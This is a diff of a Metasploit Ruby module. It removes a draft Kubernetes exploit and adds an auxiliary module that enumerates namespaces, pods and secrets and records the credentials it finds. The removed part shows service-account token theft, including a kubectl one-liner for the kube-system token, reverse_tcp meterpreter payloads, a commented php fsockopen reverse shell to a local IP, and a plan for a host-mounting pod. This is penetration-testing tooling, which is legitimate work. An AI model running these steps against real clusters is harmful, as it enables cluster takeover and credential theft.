@@ -130,9 +130,6 @@ module Kubernetes
 
     attr_reader :http_client
 
-    # TODO: Support receiving data directly as a table?
-    # Accept: application/json;as=Table;g=meta.k8s.io;v=v1beta1
-    # https://kubernetes.io/docs/reference/using-api/api-concepts/#receiving-resources-as-tables
     def call_api(request, options = {})
       token = options.fetch(:token, @token)
 
@@ -165,191 +162,14 @@ module Kubernetes
   end
 end
 
-class MetasploitModule < Msf::Exploit::Local
-  Rank = NormalRanking
-
-  include Msf::Exploit::Remote::HttpClient
-  include Msf::Post::File
-  include Msf::Auxiliary::Report
-
-  def initialize(info = {})
-    super(
-      update_info(
-        info,
-        'Name' => 'kubernetes',
-        'Description' => %q{
-          kubernetes
-
-          usage:
-
-          rerun session=-1 https://kubernetes.docker.internal:6443 verbose=true lhost=192.168.123.1
-        },
-        'License' => MSF_LICENSE,
-        'Author' => [
-        ],
-        'References' => [
-          # ['URL', 'https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/']
-        ],
-        'Stance' => Msf::Exploit::Stance::Aggressive,
-        'SessionTypes' => ['meterpreter'],
-        'Notes' => {
-          # 'SideEffects' => [ ARTIFACTS_ON_DISK ],
-          # 'Reliability' => [ UNRELIABLE_SESSION ],
-          # 'Stability' => [ SERVICE_RESOURCE_LOSS ]
-        },
-        'DefaultOptions' => {
-          'SSL' => true
-        },
-        'Targets' => [
-          [
-            'Linux x86',
-            {
-              'Platform' => 'linux',
-              'Arch' => ARCH_X86,
-              'DefaultOptions' => {
-                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'
-              }
-            }
-          ],
-          [
-            'Linux x86_64',
-            {
-              'Platform' => 'linux',
-              'Arch' => ARCH_X64,
-              'DefaultOptions' => {
-                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
-              }
-            }
-          ],
-          [
-            'php',
-            {
-              'Platform' => 'php',
-              'Arch' => [ARCH_PHP],
-              'PAYLOAD' => 'php/meterpreter/reverse_tcp',
-            }
-          ],
-
-        ],
-        # 'DisclosureDate' => '2020-01-22',
-        'DefaultTarget' => 0
-      # 'Compat' => {
-      #   'Meterpreter' => {
-      #     'Commands' => %w[
-      #       stdapi_sys_process_execute
-      #     ]
-      #   }
-      # }
-      )
-    )
-
-    register_options(
-      [
-        Opt::RHOST('127.0.0.1'),
-        Opt::RPORT(6443),
-        OptRegexp.new('HIGHLIGHT_PATTERN', [true, 'PCRE regex of names to highlight', 'username|password|user|pass']),
-      ]
-    )
-    # https://kubernetes.docker.internal:6443
+module KubernetesEnumeration
+  def enum_kubernetes_resources(kubernetes_client)
+    enum_namespaces(kubernetes_client)
   end
 
-  def setup
-  end
+  protected
 
-  def check
-    # For the check command
-  end
-
-  def exploit
-    # Hack for now, running remotely versus compromised container
-    if session
-      print_status("extracting service token from session")
-      token = read_file('/run/secrets/kubernetes.io/serviceaccount/token')
-      unless token.nil?
-        p = store_loot("jwt", "text/plain", session, token, "token", "kubernetes service token")
-        vprint_good("kubernetes service token saved: #{p}")
-      end
-    else
-      # grab kube-system token from the host
-      print_status("extracting service token from host")
-      token = `kubectl get secret -n kube-system $(kubectl -n kube-system get serviceaccount default -o jsonpath="{.secrets[0].name}") -o jsonpath="{.data.token}" | base64 --decode`
-    end
-
-    kubernetes_client = Kubernetes::Client.new({ http_client: self, token: token })
-    extract_namespaces(kubernetes_client)
-
-    print_good("Creating new pod with kubernetes token")
-
-    # TODO: Choose this based on whether it's a remote exploit, or through a session
-    # namespace_name = namespaces.first.dig(:metadata, :name)
-    # image_name = kubernetes_client.list_pod(namespace_name).dig(:items, 0, :spec, :containers, 0, :image)
-    random_identifiers = Rex::RandomIdentifier::Generator.new({ char_set: Rex::Text::LowerAlpha })
-    #
-    # cmd = "echo -n  #{Rex::Text.encode_base64("#{payload.encoded_exe}")} | base64 --decode > shell; chmod +x shell; ./shell"
-    # cmd = "echo -n #{Rex::Text.encode_base64("#{payload.encoded}")} | base64 --decode | php -e"
-    # cmd = "php -r '$sock=fsockopen(\"192.168.123.1\",4444);exec(\"sh <&3 >&3 2>&3\");'"
-
-    # print_good cmd
-    # new_pod_definition = {
-    #   apiVersion: 'v1',
-    #   kind: 'Pod',
-    #   metadata: {
-    #     name: random_identifiers[:pod_name],
-    #     labels: {}
-    #   },
-    #   spec: {
-    #     containers: [
-    #       {
-    #         name: random_identifiers[:container_name],
-    #         image: image_name,
-    #
-    #         command: [
-    #           "/bin/sh",
-    #           "-c",
-    #           cmd
-    #         ],
-    #
-    #         # TODO: Alternative approach, sleep, then exec out of band, either with a reverse shell payload, or potentially use the stream api
-    #         # Has the benefit of not crash looping and causing detection
-    #         # command: [
-    #         #   "/bin/sh",
-    #         #   "-c",
-    #         #   "sleep 20000"
-    #         # ],
-    #
-    #         volumeMounts: [
-    #           {
-    #             mountPath: '/host_mnt',
-    #             name: random_identifiers[:volume_name],
-    #           }
-    #         ]
-    #       }
-    #     ],
-    #     volumes: [
-    #       {
-    #         name: random_identifiers[:volume_name],
-    #         hostPath: {
-    #           # path: '/'
-    #           path: '/Users'
-    #         }
-    #       }
-    #     ]
-    #   }
-    # }
-
-    # pod_result = kubernetes_client.create_pod(
-    #   new_pod_definition,
-    #   namespace_name
-    # )
-    #
-    # print_good "Pod created: #{random_identifiers[:pod_name]}"
-    # print_good "Waiting for shell..."
-    # TODO: Poll for success
-    #
-  end
-
-  def extract_namespaces(kubernetes_client)
-    print_good("Extracting namespaces")
+  def enum_namespaces(kubernetes_client)
     namespaces = kubernetes_client.list_namespace[:items]
 
     origin = create_credential_origin_service(
@@ -422,7 +242,6 @@ class MetasploitModule < Msf::Exploit::Local
   end
 
   def print_secrets(namespace, secrets)
-    # https://kubernetes.io/docs/concepts/configuration/secret/#secret-types
     namespace_name = namespace.dig(:metadata, :name)
     table = create_table(
       'Header' => "Secrets (namespace: #{namespace_name})",
@@ -443,8 +262,6 @@ class MetasploitModule < Msf::Exploit::Local
     print_table(table)
   end
 
-  # Extract fields from the various secrets supported by Kubernetes:
-  # https://github.com/kubernetes/kubernetes/blob/a53e2eaeaba064309dceca2dc27f3ac09c6375b0/pkg/apis/core/validation/validation.go#L5272
   def report_secrets(origin, secrets)
     secrets.each do |secret|
       credential_data = {
@@ -562,5 +379,55 @@ class MetasploitModule < Msf::Exploit::Local
     private_key
   rescue => _e
     nil
+  end
+end
+
+class MetasploitModule < Msf::Auxiliary
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  include KubernetesEnumeration
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Kubernetes Enumeration',
+        'Description' => %q{
+          Enumerate a Kubernetes API to report useful resources such as available namespaces,
+          pods, secrets, etc.
+
+          Useful resources will be highlighted, which is customizable via the HIGHLIGHT_PATTERN
+          option.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'alanfoster'
+        ],
+        'Notes' => {
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => [],
+          'Stability' => [CRASH_SAFE]
+        },
+        'DefaultOptions' => {
+          'SSL' => true
+        },
+      )
+    )
+
+    register_options(
+      [
+        Opt::RHOST('127.0.0.1'),
+        Opt::RPORT(6443),
+        OptString.new('TOKEN', [true, 'Kubernetes API token']),
+        OptRegexp.new('HIGHLIGHT_PATTERN', [true, 'PCRE regex of resource names to highlight', 'username|password|user|pass']),
+      ]
+    )
+  end
+
+  def run
+    kubernetes_client = Kubernetes::Client.new({ http_client: self, token: datastore['TOKEN'] })
+    enum_kubernetes_resources(kubernetes_client)
   end
 end
